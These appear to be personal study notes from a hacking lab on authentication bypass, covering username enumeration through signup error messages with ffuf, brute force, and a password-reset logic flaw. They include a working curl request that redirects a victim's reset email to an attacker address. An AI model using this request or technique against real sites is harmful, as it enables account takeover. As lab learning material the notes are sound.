---
creation date: 2026-01-12 12:40
modified: 2026-01-12 12:40
tags:
---

# Authentication Bypass
- username enum - If you try entering the username **admin** and fill in the other form fields with fake information, you'll see we get the error **An account with this username already exists**. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches. (ffuf)

- brute force using ffuf
- logical flaw - If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
	- `curl 'http://10.67.136.197/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=john@hacker.com'`
	- The reset mail to be sent to John. We reset robert's password by logging as John. Then we can move laterlly to Rober's account. 




---
Last Modified: 2026-01-12


